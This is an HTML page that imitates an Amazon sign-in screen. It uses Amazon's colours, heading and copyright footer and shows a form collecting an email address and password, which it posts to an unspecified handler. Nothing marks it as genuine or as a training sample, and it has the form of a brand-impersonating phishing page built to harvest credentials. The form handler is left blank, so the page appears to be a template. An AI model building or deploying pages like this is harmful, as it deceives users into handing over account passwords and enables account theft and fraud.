<!DOCTYPE html><html><head><meta charset="UTF-8"/>
	<title>Amazon Login</title>
	<style type="text/css">body {
            font-family: Arial, sans-serif;
            color: #333;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 400px;
            margin: 50px auto;
            background: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        .header {
            background: #232f3e;
            color: #ffffff;
            padding: 10px;
            text-align: center;
            border-radius: 8px 8px 0 0;
        }
        .content {
            padding: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .button {
            display: block;
            background: #ff9900;
            color: #ffffff;
            padding: 10px;
            text-align: center;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
        }
        .footer {
            text-align: center;
            padding: 10px;
            font-size: 0.8em;
            color: #777;
        }
	</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>Sign In to Your Amazon Account</h1>
</div>

<div class="content">
<form action="" method="POST">
<div class="form-group"><label for="email">Email:</label> <input id="email" name="email" required="" type="email"/></div>

<div class="form-group"><label for="password">Password:</label> <input id="password" name="password" required="" type="password"/></div>
<input class="button" type="submit" value="Sign In"/> </form>
</div>

<div class="footer">
<p>© 2024 Amazon.com, Inc. All Rights Reserved.</p>
</div>
</div>


</body></html>
